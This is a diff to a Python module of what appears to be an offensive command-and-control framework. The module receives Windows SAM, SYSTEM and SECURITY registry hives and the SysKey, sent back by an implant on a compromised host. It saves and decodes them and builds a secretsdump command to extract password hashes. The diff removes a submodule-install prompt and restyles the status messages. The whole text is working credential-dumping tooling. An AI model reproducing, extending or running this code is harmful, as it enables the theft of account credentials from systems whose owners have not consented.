@@ -37,35 +37,9 @@ class HashDumpSAMImplant(core.implant.Implant):
         return HashDumpSAMJob
 
     def run(self):
-
         import os.path
         import os
-        if not os.path.isfile("data/impacket/examples/secretsdump.py"):
-            old_prompt = self.shell.prompt
-            old_clean_prompt = self.shell.clean_prompt
-            self.shell.prompt = '\033[1;77m'+'[?]'+'\033[0;97m'+' Would you like to get it? y/N: '+'\033[0m'
-            self.shell.clean_prompt = self.shell.prompt
-
-            self.shell.print_warning("It doesn't look like you have the impacket submodule installed yet! This module will fail if you don't have it!")
-            try:
-                import readline
-                readline.set_completer(None)
-                option = self.shell.get_command(self.shell.prompt)
-
-                if self.shell.spool:
-                    self.shell.spool_log(self.shell.clean_prompt, option)
-
-                if option.lower() == "y":
-                    from subprocess import call
-                    call(["git", "submodule", "init"])
-                    call(["git", "submodule", "update"])
-            except KeyboardInterrupt:
-                self.shell.print_plain(self.shell.clean_prompt)
-                return
-            finally:
-                self.shell.prompt = old_prompt
-                self.shell.clean_prompt = old_clean_prompt
-
+        
         payloads = {}
         payloads["js"] = "data/implant/gather/hashdump_sam.js"
 
@@ -97,7 +71,7 @@ class HashDumpSAMJob(core.job.Job):
 
         if task == "SAM":
             handler.reply(200)
-            self.print_status("Received SAM hive (%d bytes)" % len(data))
+            self.print_good("Received SAM hive (%d bytes)!" % len(data))
             self.sam_data = data
             self.sam_encoder = handler.get_header("encoder", 1252)
             return
@@ -105,7 +79,7 @@ class HashDumpSAMJob(core.job.Job):
         if task == "SYSTEM":
             handler.reply(200)
 
-            self.print_status("Received SYSTEM hive (%d bytes)" % len(data))
+            self.print_good("Received SYSTEM hive (%d bytes)!" % len(data))
             self.system_data = data
             self.system_encoder = handler.get_header("encoder", 1252)
             return
@@ -113,7 +87,7 @@ class HashDumpSAMJob(core.job.Job):
         if task == "SysKey":
             handler.reply(200)
 
-            self.print_status("Received SysKey (%d bytes)" % len(data))
+            self.print_good("Received SysKey (%d bytes)!" % len(data))
             self.syskey_data = data
             self.system_data = ""
             self.syskey_encoder = handler.get_header("encoder", 1252)
@@ -122,7 +96,7 @@ class HashDumpSAMJob(core.job.Job):
         if task == "SECURITY":
             handler.reply(200)
 
-            self.print_status("Received SECURITY hive (%d bytes)" % len(data))
+            self.print_good("Received SECURITY hive (%d bytes)!" % len(data))
             self.security_data = data
             self.security_encoder = handler.get_header("encoder", 1252)
             return
@@ -156,7 +130,7 @@ class HashDumpSAMJob(core.job.Job):
             data = self.decode_downloaded_data(data, "936")
             with open(self.security_file, "wb") as f:
                 f.write(data)
-        self.print_status("Decoded SECURITY hive (%s)" % self.security_file)
+        self.print_good("Decoded SECURITY hive (%s)!" % self.security_file)
 
         if self.system_data:
             self.system_file = self.save_file(self.system_data, "SYSTEM", self.system_encoder)
@@ -166,7 +140,7 @@ class HashDumpSAMJob(core.job.Job):
                 data = self.decode_downloaded_data(data, "936")
                 with open(self.system_file, "wb") as f:
                     f.write(data)
-            self.print_status("Decoded SYSTEM hive (%s)" % self.system_file)
+            self.print_good("Decoded SYSTEM hive (%s)!" % self.system_file)
             cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
         else:
             self.syskey_data_file = self.save_file(self.syskey_data, "SYSKEY", self.syskey_encoder)
